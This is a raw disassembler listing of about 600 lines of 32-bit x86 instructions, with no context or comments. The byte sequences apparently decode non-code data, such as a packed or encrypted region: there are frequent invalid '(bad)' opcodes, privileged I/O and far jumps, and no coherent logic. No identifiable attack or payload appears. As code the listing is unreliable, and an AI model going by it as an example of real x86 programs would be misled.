  40376f:	add    BYTE PTR [edi+ebx*4+0x34e78815],al
  403776:	mov    ah,0x21
  403778:	inc    ebp
  403779:	std    
  40377a:	(bad)
  40377e:	cmp    ebp,edx
  403780:	push   esp
  403781:	dec    esi
  403782:	mov    ch,0xaf
  403784:	mov    ch,0x51
  403786:	inc    eax
  403787:	sbb    dh,al
  403789:	enter  0x187d,0x8e
  40378d:	sbb    al,0xb6
  40378f:	cmp    BYTE PTR [ebp+edx*4+0x38],cl
  403793:	ret    
  403794:	mov    ebp,edi
  403796:	and    BYTE PTR [eax-0x4b],al
  403799:	retf   0x6334
  40379c:	push   0xffffffc0
  40379e:	push   edx
  40379f:	push   0x8b784ae3
  4037a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037a5:	ror    DWORD PTR [ebp+0x1c],0xc
  4037a9:	int    0x35
  4037ab:	(bad)  
  4037ac:	loope  0x4037a4
  4037ae:	add    al,BYTE PTR [ebx+0x15db713e]
  4037b4:	dec    BYTE PTR [ebx]
  4037b6:	mov    bh,0x2c
  4037b8:	sub    BYTE PTR [edi+0x1b],ch
  4037bb:	sub    al,0x14
  4037bd:	ins    DWORD PTR es:[edi],dx
  4037be:	jo     0x403782
  4037c0:	jnp    0xcd679f7f
  4037c6:	imul   esi,DWORD PTR [edx-0x50797593],0xea78d65e
  4037d0:	out    0x45,eax
  4037d2:	hlt    
  4037d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037d4:	hlt    
  4037d5:	rol    BYTE PTR [ecx+0x1855752f],0x72
  4037dc:	into   
  4037dd:	sub    DWORD PTR [ecx+0x6b4871eb],esp
  4037e3:	jbe    0x40380a
  4037e5:	mov    ss,WORD PTR [ebx+0xfe9a587]
  4037eb:	pusha  
  4037ec:	popa   
  4037ed:	inc    ebp
  4037ee:	xchg   esp,edi
  4037f0:	cli    
  4037f1:	shr    BYTE PTR [edi-0x48],cl
  4037f4:	push   ebx
  4037f5:	fdivr  DWORD PTR [ebx+edx*8+0x654faca3]
  4037fc:	mov    eax,ds:0xf1ed1cfc
  403801:	and    DWORD PTR cs:[eax+0xb],edx
  403805:	and    al,0x36
  403807:	test   BYTE PTR [eax+0x48a798eb],al
  40380d:	xor    BYTE PTR [ebp-0x79703faa],ah
  403813:	loope  0x4037ea
  403815:	cmc    
  403816:	push   0x376983c2
  40381b:	or     edi,DWORD PTR [ebx+0x586053a]
  403821:	loope  0x40383b
  403823:	mov    edx,0xa9c2d121
  403828:	pop    ebx
  403829:	sbb    BYTE PTR [ecx-0x6d],al
  40382c:	mov    ebx,0x19a084f5
  403831:	or     BYTE PTR [ecx-0x5e],cl
  403834:	or     esp,edi
  403836:	nop
  403837:	js     0x4037ea
  403839:	int    0x8e
  40383b:	mov    esp,0xd1d6059d
  403840:	shl    ah,0x14
  403843:	pushf  
  403844:	and    al,0xf1
  403846:	dec    edi
  403847:	ret    0xf242
  40384a:	jbe    0x403838
  40384c:	and    eax,0x3504d1d3
  403851:	dec    DWORD PTR [edx-0x615f8843]
  403857:	pop    eax
  403858:	lock mov ch,0x7
  40385b:	add    al,0xc
  40385d:	call   0x7cc09284
  403862:	je     0x40383b
  403864:	or     eax,0x6796ed64
  403869:	jbe    0x40380d
  40386b:	(bad)  
  40386c:	dec    esp
  40386d:	loop   0x403808
  40386f:	mov    bl,0x73
  403871:	xchg   ebp,eax
  403872:	sbb    ah,BYTE PTR [eax]
  403874:	fimul  DWORD PTR [ebx+0xe]
  403877:	mov    ds:0xffa5db3a,al
  40387c:	test   eax,0xb5d04180
  403881:	xchg   edx,edx
  403883:	push   edx
  403884:	pop    ebx
  403885:	push   edx
  403886:	dec    esp
  403887:	pushf  
  403888:	jne    0x4038a6
  40388a:	jne    0x4038e8
  40388c:	test   eax,0x596d3d3
  403891:	and    cl,al
  403893:	test   eax,0xcc04b73
  403898:	xchg   BYTE PTR gs:[edi-0x4a],dh
  40389c:	jb     0x403866
  40389e:	mov    ecx,0xb8c4d9e1
  4038a3:	loop   0x403835
  4038a5:	ja     0x403835
  4038a7:	ins    DWORD PTR es:[edi],dx
  4038a8:	arpl   WORD PTR [ebp+0x22],dx
  4038ab:	push   ebx
  4038ac:	push   ss
  4038ad:	inc    eax
  4038ae:	sub    DWORD PTR [ecx+edi*4-0x2f],ebp
  4038b2:	add    DWORD PTR [esi+0x4af044f0],0xfa0a7f0e
  4038bc:	test   DWORD PTR ds:0xad6a08e4,0x8204a8cd
  4038c6:	cwde   
  4038c7:	loope  0x4038e4
  4038c9:	lock xchg esi,eax
  4038cb:	(bad)  
  4038cc:	jecxz  0x40393c
  4038ce:	loop   0x403877
  4038d0:	test   al,0x9d
  4038d2:	jmp    FWORD PTR [esi]
  4038d4:	xchg   ebp,ebx
  4038d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038d7:	xor    BYTE PTR [ebx+edx*1-0x4c],ch
  4038db:	(bad)  
  4038dc:	rcl    dh,1
  4038de:	xchg   edi,eax
  4038df:	sbb    eax,0x4c5668f
  4038e4:	pop    ebx
  4038e5:	inc    edi
  4038e6:	cmp    DWORD PTR [ebx-0x3faf4fa8],esp
  4038ec:	push   ds
  4038ed:	push   eax
  4038ee:	dec    eax
  4038ef:	push   cs
  4038f0:	cdq    
  4038f1:	add    al,0x15
  4038f3:	xchg   edx,esp
  4038f5:	inc    ebp
  4038f6:	out    dx,al
  4038f7:	hlt    
  4038f8:	or     eax,0x9aba02bd
  4038fd:	xlat   BYTE PTR ds:[ebx]
  4038fe:	jbe    0x403948
  403900:	pusha  
  403901:	mov    ebp,DWORD PTR [edx]
  403903:	fst    DWORD PTR [edi+ebp*4]
  403906:	dec    esp
  403907:	push   ss
  403908:	or     eax,0x3c7ed1ed
  40390d:	mov    al,ds:0x595ee802
  403912:	js     0x4038a0
  403914:	(bad)  
  403915:	mov    edx,0x561bbf72
  40391a:	ja     0x40392e
  40391c:	fstp   TBYTE PTR [edx-0x49]
  40391f:	call   0x2c4c:0x463b73b6
  403926:	xchg   esp,eax
  403927:	rcl    eax,cl
  403929:	xlat   BYTE PTR ds:[ebx]
  40392a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40392b:	sub    BYTE PTR [edi-0x59],bh
  40392e:	inc    esp
  40392f:	jmp    0xb09a:0xde47a98
  403936:	dec    edi
  403937:	jne    0x403976
  403939:	jne    0x4038c9
  40393b:	push   esi
  40393c:	xchg   edi,eax
  40393d:	push   es
  40393e:	rol    ah,cl
  403940:	fadd   DWORD PTR [edi]
  403942:	or     BYTE PTR [eax],dh
  403944:	icebp  
  403945:	cmp    al,0x44
  403947:	(bad)  
  403948:	(bad)  
  403949:	xchg   ebp,eax
  40394a:	ret    
  40394b:	and    eax,0xb31482e6
  403950:	out    dx,eax
  403951:	mov    DWORD PTR [eax+ebx*8-0x48d8914d],edx
  403958:	or     ah,0x1f
  40395b:	fdiv   st,st(5)
  40395d:	jmp    0x403959
  40395f:	push   ds
  403960:	mov    edi,0x59096a60
  403965:	in     eax,dx
  403966:	mov    ecx,0x262ecf9b
  40396b:	shl    eax,1
  40396d:	sti    
  40396e:	adc    BYTE PTR [esp+edx*1-0x42],cl
  403972:	add    DWORD PTR [esi+ebp*1],0xffffffc7
  403976:	cli    
  403977:	jmp    FWORD PTR [eax+0x21]
  40397a:	push   esi
  40397b:	shl    DWORD PTR [edi+0x52f3fe8f],cl
  403981:	nop
  403982:	push   cs
  403983:	mov    dh,0xd4
  403985:	push   eax
  403986:	loopne 0x40396d
  403988:	repz fdivr QWORD PTR [edx]
  40398b:	in     al,0xfe
  40398d:	mov    dl,0xba
  40398f:	mov    BYTE PTR [edx-0x37],ch
  403992:	inc    ecx
  403993:	and    DWORD PTR [esp+ebp*2+0x25],esi
  403997:	and    ah,BYTE PTR [eax-0x54]
  40399a:	and    dh,BYTE PTR [eax+0x7a]
  40399d:	or     eax,0xcb69051a
  4039a2:	mov    ecx,0x6fb9f0bf
  4039a7:	jecxz  0x403975
  4039a9:	cmp    BYTE PTR [eax],dl
  4039ab:	test   BYTE PTR [ecx+0x46b532b2],0x88
  4039b2:	or     BYTE PTR [edx+0x5b],bh
  4039b5:	sti    
  4039b6:	(bad)  es:[edi+0x46ebe7b4]
  4039bd:	cmp    edx,DWORD PTR [ebx-0x86962ca]
  4039c3:	add    BYTE PTR [ecx+0x7],0x26
  4039c7:	aas    
  4039c8:	nop
  4039c9:	outs   dx,BYTE PTR ds:[esi]
  4039ca:	and    dl,dh
  4039cc:	jo     0x403a40
  4039ce:	mov    edi,0x7414d765
  4039d3:	icebp  
  4039d4:	xchg   BYTE PTR [edi+0x7a4eacbc],cl
  4039da:	sub    DWORD PTR [edi-0x21],0xffffffde
  4039de:	or     esi,DWORD PTR [edi]
  4039e0:	pushf  
  4039e1:	loopne 0x403a39
  4039e3:	or     al,0x9
  4039e5:	inc    eax
  4039e6:	mov    esi,0x9b6f5ae6
  4039eb:	mov    eax,0xab73445
  4039f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039f1:	add    al,0x7e
  4039f3:	add    al,0x35
  4039f5:	dec    eax
  4039f6:	mov    es,WORD PTR [ebp+0x2f]
  4039f9:	cmp    eax,0x405353c0
  4039fe:	adc    eax,0x52a643f2
  403a03:	jnp    0x4039dd
  403a05:	enter  0x8ef0,0x90
  403a09:	jge    0x403a79
  403a0b:	jae    0x403991
  403a0d:	imul   eax
  403a0f:	inc    edx
  403a10:	ficom  WORD PTR [eax-0x6fd8de6a]
  403a16:	xor    esp,DWORD PTR [ebx+0x73]
  403a19:	push   0xf018d257
  403a1e:	sbb    al,0xf7
  403a20:	xor    dh,al
  403a22:	test   ah,ch
  403a24:	xchg   ebx,eax
  403a25:	pavgb  mm5,QWORD PTR [ecx]
  403a28:	jg     0x4039df
  403a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a2b:	imul   eax,esp,0x64a45f06
  403a31:	enter  0xb9c4,0x2d
  403a35:	neg    DWORD PTR ds:0xe472a492
  403a3b:	(bad)  
  403a3c:	sbb    eax,0xae089ca8
  403a41:	dec    edx
  403a42:	loop   0x4039c9
  403a44:	test   dl,0x9b
  403a47:	rol    eax,0x64
  403a4a:	inc    DWORD PTR [edi+esi*2+0x75564ac0]
  403a51:	xchg   ebp,eax
  403a52:	adc    dh,BYTE PTR [esp]
  403a55:	imul   esi,DWORD PTR [edi+0x5],0x39
  403a59:	jge    0x403a61
  403a5b:	mov    ds:0x5672bc55,eax
  403a60:	jmp    0x8abfbf02
  403a65:	push   ebx
  403a66:	loop   0x403a5d
  403a68:	jae    0x403abe
  403a6a:	out    0xc5,al
  403a6c:	mov    bl,0x6
  403a6e:	pop    es
  403a6f:	loop   0x403a02
  403a71:	inc    cl
  403a73:	sub    esi,ecx
  403a75:	push   esp
  403a76:	push   esi
  403a77:	jns    0x403a59
  403a79:	jp     0x403a90
  403a7b:	or     BYTE PTR [eax-0xe],ch
  403a7e:	cmp    eax,0x873a0aad
  403a83:	jbe    0x403a25
  403a85:	ins    DWORD PTR es:[edi],dx
  403a86:	and    ebp,edi
  403a88:	add    ebx,DWORD PTR [ecx]
  403a8a:	push   ss
  403a8b:	rcr    bl,0x7d
  403a8e:	xor    al,0x23
  403a90:	fs je  0x403a8f
  403a93:	shl    DWORD PTR [ebp-0x5e],1
  403a96:	aas    
  403a97:	jo     0x403b05
  403a99:	scas   al,BYTE PTR es:[edi]
  403a9a:	mov    BYTE PTR [ecx+0x4205e445],cl
  403aa0:	out    0x3e,eax
  403aa2:	mov    ch,0xd0
  403aa4:	mov    ebp,0x33af7171
  403aa9:	(bad)  
  403aaa:	mov    eax,ds:0xe4e24864
  403aaf:	test   al,0xd8
  403ab1:	not    edi
  403ab3:	xchg   BYTE PTR [esi-0x395b2291],ah
  403ab9:	and    BYTE PTR [esi-0x1a],al
  403abc:	mov    cl,0x63
  403abe:	jmp    0xad62:0xc11e2017
  403ac5:	mov    ds,WORD PTR [ebp+0x63baf15b]
  403acb:	push   es
  403acc:	mov    edx,0xb15f0513
  403ad1:	aad    0xcf
  403ad3:	adc    al,0x50
  403ad5:	ja     0x403ab5
  403ad7:	mov    bl,0x8f
  403ad9:	push   ebp
  403ada:	(bad)  
  403adb:	mov    ecx,0xf6862e7f
  403ae0:	std    
  403ae1:	sub    eax,0xb048c822
  403ae6:	jne    0x403a8e
  403ae8:	jmp    0x2755:0x411522a5
  403aef:	mov    eax,ds:0x2f9c9a37
  403af4:	fs dec edx
  403af6:	push   es
  403af7:	icebp  
  403af8:	or     DWORD PTR [ecx+ebp*2+0x5e],ebx
  403afc:	mov    ds:0xdae0493b,eax
  403b01:	sbb    esp,DWORD PTR [edi+0x49]
  403b04:	repz pop ds
  403b06:	and    esi,ecx
  403b08:	inc    edx
  403b09:	out    0xdb,eax
  403b0b:	xor    DWORD PTR [ebp+0x58a17e15],ebx
  403b11:	mov    bh,0x28
  403b13:	data16 mov WORD PTR [ebx+0x5a19ad78],ss
  403b1a:	sub    eax,0x2fcfdd71
  403b1f:	in     al,0x12
  403b21:	or     esi,DWORD PTR fs:0x163fca14
  403b28:	shr    DWORD PTR [esp+ebx*2],cl
  403b2b:	push   edi
  403b2d:	jns    0x403ac6
  403b2f:	sub    DWORD PTR [edx+0x24421783],esi
  403b35:	mov    edi,ecx
  403b37:	mov    ds:0xd324c7ff,al
  403b3c:	cli    
  403b3d:	fisubr WORD PTR [eax]
  403b3f:	stos   DWORD PTR es:[edi],eax
  403b40:	(bad)  
  403b41:	lds    edx,FWORD PTR [esi+edi*2]
  403b44:	or     dh,dl
  403b46:	sbb    al,0x67
  403b48:	popf   
  403b49:	scas   al,BYTE PTR es:[edi]
  403b4a:	mov    ecx,0xcc7f8d3b
  403b4f:	or     ah,BYTE PTR ds:0xe9a37e74
  403b55:	or     bl,0x75
  403b58:	dec    edi
  403b59:	jo     0x403b69
  403b5b:	repnz popf 
  403b5d:	xor    eax,0x5e0eed90
  403b62:	mov    ecx,0xac03c16d
  403b67:	xor    eax,0xef47b81a
  403b6c:	and    ecx,DWORD PTR ds:0xa52ab339
  403b72:	mov    ch,0x9d
  403b74:	popf   
  403b75:	dec    esi
  403b76:	or     al,0x5e
  403b78:	stos   DWORD PTR es:[edi],eax
  403b79:	mov    ah,0xb2
  403b7b:	test   al,0x29
  403b7d:	push   0xb5401bf4
  403b82:	ja     0x403bd1
  403b84:	scas   al,BYTE PTR es:[edi]
  403b85:	enter  0xacaf,0x41
  403b89:	out    dx,al
  403b8a:	cmp    DWORD PTR [ebx+0x57],ecx
  403b8d:	je     0x403bf1
  403b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b90:	push   eax
  403b91:	(bad)  
  403b92:	in     al,dx
  403b93:	(bad)  
  403b94:	out    dx,al
  403b95:	or     al,0x92
  403b97:	mov    bh,BYTE PTR [ecx-0x1c39ecd6]
  403b9d:	jns    0x403c1d
  403b9f:	jb     0x403b88
  403ba1:	dec    esi
  403ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ba3:	push   cs
  403ba4:	bound  edx,QWORD PTR [eax+eax*8]
  403ba7:	popa   
  403ba8:	in     al,dx
  403ba9:	test   eax,0xfd164609
  403bae:	xchg   ebx,eax
  403baf:	arpl   ax,cx
  403bb1:	xchg   ebp,ebp
  403bb3:	lods   al,BYTE PTR ds:[esi]
  403bb4:	mov    edi,DWORD PTR [ebx]
  403bb6:	xchg   BYTE PTR [esi],ah
  403bb8:	aam    0xe6
  403bba:	pop    edi
  403bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bbc:	jg     0x403b52
  403bbe:	lds    ebp,FWORD PTR [edx+0x3dc56e31]
  403bc4:	mov    BYTE PTR [ebp-0x4f44ae41],bl
  403bca:	cwde   
  403bcb:	jns    0x403be3
  403bcd:	fistp  DWORD PTR [edx+esi*1]
  403bd0:	pop    esp
  403bd1:	and    eax,0xdb7072cd
  403bd6:	test   esi,0xd54434c9
  403bdc:	xchg   ebp,eax
  403bdd:	test   al,0x71
  403bdf:	cmp    ah,BYTE PTR [ebx+0x1e]
  403be2:	and    eax,0xbe19e41a
  403be7:	jnp    0x403bff
  403be9:	int3   
  403bea:	lock test DWORD PTR [eax+eax*8],0x2ed625c3
  403bf2:	push   ss
  403bf3:	loop   0x403c3f
  403bf5:	test   DWORD PTR [ecx+0x4b1c7993],0x2aed4227
  403bff:	adc    bl,BYTE PTR [eax]
  403c01:	in     eax,0xb2
  403c03:	clc    
  403c04:	les    esp,FWORD PTR [eax-0x1fcfe190]
  403c0a:	adc    ebp,edx
  403c0c:	xor    eax,0xe1d9ac85
  403c11:	ss out 0x4f,al
  403c14:	mov    bl,0xc1
  403c16:	leave  
  403c17:	mov    edi,DWORD PTR es:[ecx-0x4e]
  403c1b:	sub    al,0xe9
  403c1d:	ins    DWORD PTR es:[edi],dx
  403c1e:	cmp    edi,esp
  403c20:	cmc    
  403c21:	sub    eax,0x6172a520
  403c26:	cmp    ah,bh
  403c28:	xchg   BYTE PTR ds:0x8446e23c,dh
  403c2e:	test   DWORD PTR [ebp-0x189072b5],0xf9f2679d
  403c38:	pop    edi
  403c39:	sub    DWORD PTR [edi+0x18],edx
  403c3c:	mov    ds:0xac4fe148,al
  403c41:	in     al,dx
  403c42:	mov    esp,0x3ee96590
  403c47:	xor    BYTE PTR [esi+edx*8-0x32],ch
  403c4b:	mov    edx,0xfc609dba
  403c50:	or     eax,0x79da9ad9
  403c55:	adc    edi,DWORD PTR es:[esi]
  403c58:	cmc    
  403c59:	out    dx,eax
  403c5a:	lds    esp,FWORD PTR [ebp+0x62d36a79]
  403c60:	pop    eax
  403c61:	fmul   QWORD PTR ds:0x937c7cc7
  403c67:	std    
  403c68:	sbb    al,0xf1
  403c6a:	fcmovnu st,st(7)
  403c6c:	push   ss
  403c6d:	dec    ecx
  403c6e:	imul   eax,esp,0xe8222a4a
  403c74:	cmc    
  403c75:	enter  0xa0e7,0x7
  403c79:	rol    DWORD PTR [esi-0x6],1
  403c7c:	fwait
  403c7d:	xchg   ebp,eax
  403c7e:	and    DWORD PTR [ebx+0x6e],ebp
  403c81:	pop    ebx
  403c82:	pop    ebx
  403c83:	pop    ds
  403c84:	xor    DWORD PTR [ecx-0x5cf7b7c],0xfffffff1
  403c8b:	ins    BYTE PTR es:[edi],dx
  403c8c:	aad    0xe0
  403c8e:	add    BYTE PTR [edi*8+0x4e6f9ea9],bh
  403c95:	into   
  403c96:	mov    al,ds:0xda13a9db
  403c9b:	ins    BYTE PTR es:[edi],dx
  403c9c:	push   esi
  403c9d:	inc    esp
  403c9e:	iret   
  403c9f:	push   eax
  403ca0:	jmp    0x571e:0x4b8ef763
  403ca7:	loope  0x403c4d
  403ca9:	shl    BYTE PTR [ecx+ebp*1],cl
  403cac:	cmp    BYTE PTR [ebx-0x47],dh
  403caf:	cli    
  403cb0:	push   0xee08c814
  403cb5:	lahf   
  403cb6:	inc    ecx
  403cb7:	mov    edx,0x31983c6
  403cbc:	pop    esi
  403cbd:	inc    edi
  403cbe:	fdiv   DWORD PTR [edi-0x26]
  403cc1:	add    BYTE PTR [ecx-0x84543da],al
  403cc7:	into   
  403cc8:	jg     0x403ce1
  403cca:	sub    DWORD PTR ds:0x2e7d80c0,0x56
  403cd1:	sbb    bl,BYTE PTR [ebp+ebx*2-0x40]
  403cd5:	mul    BYTE PTR [edx]
  403cd7:	ficomp WORD PTR [eax-0x7f]
  403cda:	jne    0x403cbd
  403cdc:	mov    DWORD PTR [ecx],esi
  403cde:	xchg   ecx,eax
  403cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ce0:	enter  0x7a59,0x3b
  403ce4:	mov    esi,0x9439fc93
  403ce9:	lock xchg esi,eax
  403ceb:	rol    BYTE PTR [esi],cl
  403ced:	inc    esi
  403cee:	mov    eax,0xd8e94dc7
  403cf3:	imul   edi,edx,0x5a162175
  403cf9:	inc    ebp
  403cfa:	call   0x62abaa34
  403cff:	out    dx,eax
  403d00:	shl    edi,cl
  403d02:	or     al,0xd3
  403d04:	ror    ah,cl
  403d06:	dec    edx
  403d07:	xchg   BYTE PTR [ebx],bl
  403d09:	fnstenv [esp+ecx*4+0x32153655]
  403d10:	pop    ebx
  403d11:	and    ah,ch
  403d13:	retf   0x8f15
  403d16:	sti    
  403d17:	jns    0x403d43
  403d19:	pop    edi
  403d1a:	pop    ebp
  403d1b:	fs sbb eax,esp
  403d1e:	lods   eax,DWORD PTR ds:[esi]
  403d1f:	sbb    DWORD PTR [edx+eiz*4+0x7547b8ca],ecx
  403d26:	fstp   DWORD PTR [edi]
  403d28:	mov    esi,0xd23c24d2
  403d2d:	call   0x37f0ffd0
  403d32:	jmp    0x403d27
  403d34:	jmp    0x35ceebd9
  403d39:	ficom  DWORD PTR [ebx+0x1a81cf33]
  403d3f:	dec    ecx
  403d40:	or     al,ah
  403d42:	js     0x403d9d
  403d44:	cli    
  403d45:	push   ds
  403d46:	(bad)  
  403d48:	mov    dl,0xed
  403d4a:	push   cs
  403d4b:	sub    bl,cl
  403d4d:	or     DWORD PTR [edx-0x18],0x43b06766
  403d54:	les    edi,FWORD PTR [esi]
  403d56:	mov    cl,0x6f
  403d58:	int    0x51
  403d5a:	mov    ecx,0xf86e4b77
  403d5f:	test   al,0xa5
  403d61:	or     al,0xfb
  403d63:	ror    esi,1
  403d65:	push   ss
  403d66:	jle    0x403dde
  403d68:	loop   0x403d02
  403d6a:	mov    eax,ds:0x9bf7f8d0
  403d6f:	push   edx
  403d70:	aam    0x21
  403d72:	(bad)  
  403d73:	rcr    BYTE PTR [edi+0x17],1
  403d76:	call   0x2073:0xde5d9703
  403d7d:	push   cs
  403d7e:	lods   al,BYTE PTR ds:[esi]
  403d7f:	sub    DWORD PTR [ecx],ecx
  403d81:	dec    edx
  403d82:	aam    0x7f
  403d84:	mov    ch,al
  403d86:	or     ebp,ecx
  403d88:	and    al,0xa0
  403d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d8b:	hlt    
  403d8c:	push   esi
  403d8d:	dec    edi
  403d8e:	mov    ds:0xa10c3914,al
  403d93:	in     al,0x26
  403d95:	sbb    eax,DWORD PTR [edi-0x4c7fe062]
  403d9b:	sti    
  403d9c:	retf   0xd54d
  403d9f:	test   al,0x71
  403da1:	xchg   edx,eax
  403da2:	dec    esi
  403da3:	cmp    ah,BYTE PTR [eax+0x7187959c]
  403da9:	into   
  403daa:	push   edx
  403dab:	and    al,0x76
  403dad:	jge    0x403d57
  403daf:	mov    ss,esp
  403db1:	int3   
  403db2:	in     eax,0x51
  403db4:	loop   0x403d75
  403db6:	mov    dh,BYTE PTR [ecx-0x3a14ec6b]
  403dbc:	stos   BYTE PTR es:[edi],al
  403dbd:	test   cl,0xea
  403dc0:	mov    eax,ds:0x88fe1d89
  403dc5:	call   0x737a2646
  403dca:	ds jg  0x403dd8
  403dcd:	pop    ds
  403dce:	and    eax,0xeb1887af
  403dd3:	or     eax,0xba07097
  403dd8:	fcom   DWORD PTR [ebx+edi*8]
  403ddb:	(bad)  
  403ddc:	adc    DWORD PTR [esi],eax
  403dde:	mov    bl,0xd0
  403de0:	and    eax,0xfa32c868
  403de5:	mov    ah,ch
  403de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403de8:	mov    WORD PTR [eax+edi*1+0x14],dx
  403ded:	xchg   esi,eax
  403dee:	and    al,BYTE PTR [edx-0xc]
  403df1:	shl    BYTE PTR [edi+0x23],0x14
  403df5:	pop    eax
  403df6:	mov    al,ds:0x7750bdb9
  403dfb:	dec    eax
  403dfc:	int    0x91
  403dfe:	pop    esi
  403dff:	push   ss
  403e00:	cmp    eax,DWORD PTR [ecx+0x7f5ca19a]
  403e06:	test   al,0x3d
  403e08:	les    edx,FWORD PTR [ebp+ecx*8+0x6dd0dcab]
  403e0f:	jge    0x403e64
  403e11:	sahf   
  403e12:	mul    ah
  403e14:	add    WORD PTR [ecx+0x27b00d0d],ax
  403e1b:	test   BYTE PTR [esi-0x3b],bl
  403e1e:	push   ds
  403e1f:	jae    0x403dd9
  403e21:	cmp    BYTE PTR [ecx],bl
  403e23:	and    al,0x26
  403e25:	xchg   edx,eax
  403e26:	push   ebp
  403e27:	(bad)  
  403e28:	sbb    eax,0xdaaa0e98
  403e2d:	sti    
  403e2e:	sub    BYTE PTR [esi+eax*2-0x261adc86],cl
  403e35:	sbb    DWORD PTR [esi-0x4d796100],ebp
  403e3b:	pop    ebx
  403e3c:	test   BYTE PTR [eax-0xb],ch
  403e3f:	or     al,0x42
  403e41:	adc    ah,BYTE PTR [eax]
  403e43:	mov    esp,edi
  403e45:	xor    al,0xdf
  403e47:	adc    DWORD PTR [eax+0x21],ebp
  403e4a:	addr16 loop 0x403e6a
  403e4d:	pushf  
  403e4e:	mov    BYTE PTR [ebx-0x6f650612],ch
  403e54:	mov    ebx,0xa220690
  403e59:	mov    al,0xb0
  403e5b:	dec    edx
  403e5c:	or     al,BYTE PTR gs:[eax-0x2db22b30]
  403e63:	imul   esp,DWORD PTR ds:0xb5e82ffa,0xfffffff2
  403e6a:	cmp    ecx,DWORD PTR [ecx+0x2412644f]
  403e70:	add    eax,0x6a24af5a
  403e75:	ds cmc 
  403e77:	inc    esi
  403e78:	or     dl,ch
  403e7a:	push   ebp
  403e7b:	in     al,dx
  403e7c:	cmp    esp,DWORD PTR [edi]
  403e7e:	or     eax,0x7f9e6ce4
  403e83:	push   ebx
  403e84:	or     al,0x88
  403e86:	das    
  403e87:	in     al,dx
  403e88:	add    dh,al
  403e8a:	mov    eax,0xe91d6860
  403e8f:	in     al,0xa
  403e91:	cmp    esp,DWORD PTR [ebp-0x58]
  403e94:	dec    edx
  403e95:	les    edi,FWORD PTR [edi+0x67]
  403e98:	and    DWORD PTR [edx+0x18],0xc9e0a9fc
  403e9f:	lahf   
  403ea0:	sar    DWORD PTR [edi+0x71],0xfd
  403ea4:	pop    ecx
  403ea5:	pop    ss
  403ea6:	jmp    0xfa87ab99
  403eab:	addr16 clc 
  403ead:	sbb    al,0xed
  403eaf:	xor    edi,ebp
  403eb1:	adc    DWORD PTR [ebx],esp
  403eb3:	sub    eax,0x57af83a6
  403eb8:	cdq    
  403eb9:	(bad)  [eax+0x5f]
  403ebc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ebd:	inc    eax
  403ebe:	xchg   DWORD PTR [ecx-0x23dd6a3a],edi
  403ec4:	je     0x403e77
  403ec6:	dec    edx
  403ec7:	lock cmp edi,DWORD PTR [ebx-0xf]
  403ecb:	xchg   edx,ebp
  403ecd:	pop    ebx
  403ece:	and    al,al
  403ed0:	fsubr  DWORD PTR [edx+0x51b245d8]
  403ed6:	jo     0x403ee1
  403ed8:	aad    0x20
  403eda:	mov    edi,0xdd7e718f
  403edf:	pusha  
  403ee0:	add    DWORD PTR [esi+ecx*1-0x28],esp
  403ee4:	and    cl,cl
  403ee6:	popa   
  403ee7:	or     al,0x22
  403ee9:	xor    eax,0x41bb511a
  403eee:	mov    ds:0xe0291dcd,eax
  403ef3:	add    eax,0x6917573c
  403ef8:	fs cwde 
  403efa:	jecxz  0x403ee4
  403efc:	and    eax,0x3a64d409
  403f01:	jp     0x403ed8
  403f03:	push   edx
  403f04:	test   DWORD PTR [ebx+0x73],edi
  403f07:	cli    
  403f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f09:	pop    ds
  403f0a:	fdivrp st(3),st
  403f0c:	ja     0x403f2f
  403f0e:	xchg   esi,eax
  403f0f:	enter  0xce1a,0x6a
  403f13:	pop    esi
  403f14:	xor    BYTE PTR [edi-0x7114ae6c],ch
  403f1a:	les    ecx,FWORD PTR [edi+0x502802c7]
  403f20:	or     dl,al
  403f22:	clc    
  403f23:	mov    BYTE PTR [ebp-0x70],0xf3
  403f27:	jecxz  0x403ed8
  403f29:	fld    DWORD PTR [edi]
  403f2b:	sti    
  403f2c:	sbb    DWORD PTR [ebx-0x48],0xffffffa9
  403f30:	(bad)  
  403f31:	(bad)  [edx]
  403f33:	xchg   esi,eax
  403f34:	gs dec ebx
  403f36:	or     ebx,DWORD PTR [ebx]
  403f38:	jp     0x403f38
  403f3a:	dec    esi
  403f3b:	or     DWORD PTR [edi+0x1b],edi
  403f3e:	inc    edx
  403f3f:	in     al,0x26
  403f41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f42:	adc    eax,0xb88c119d
  403f47:	shl    BYTE PTR [edx],0xa8
  403f4a:	retf   0xf272
  403f4d:	mov    edx,cr2
  403f50:	jecxz  0x403f31
  403f52:	xchg   edx,eax
  403f53:	stos   DWORD PTR es:[edi],eax
  403f54:	inc    edx
  403f55:	aam    0xe9
  403f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f58:	xor    al,0x82
  403f5a:	pop    esi
  403f5b:	(bad)  
  403f5c:	inc    DWORD PTR [edi-0x3edcd63b]
  403f62:	fild   DWORD PTR [esi-0x590a6fc1]
  403f68:	ds pop edi
  403f6a:	xchg   edx,eax
  403f6b:	sbb    DWORD PTR [eax+0x1219fd0a],esi
  403f71:	add    bl,BYTE PTR [edx+0x2f]
  403f74:	iret   
  403f75:	jae    0x403f1b
  403f77:	jnp    0x403fe8
  403f79:	mov    esi,0x6f89b047
  403f7e:	pushf  
  403f7f:	adc    al,0x4c
  403f81:	cmp    al,0xf5
  403f83:	push   ebx
  403f84:	pop    edi
  403f85:	push   ecx
  403f86:	push   ebx
  403f87:	xchg   BYTE PTR [ebp-0x4cdab0e4],cl
  403f8d:	hlt    
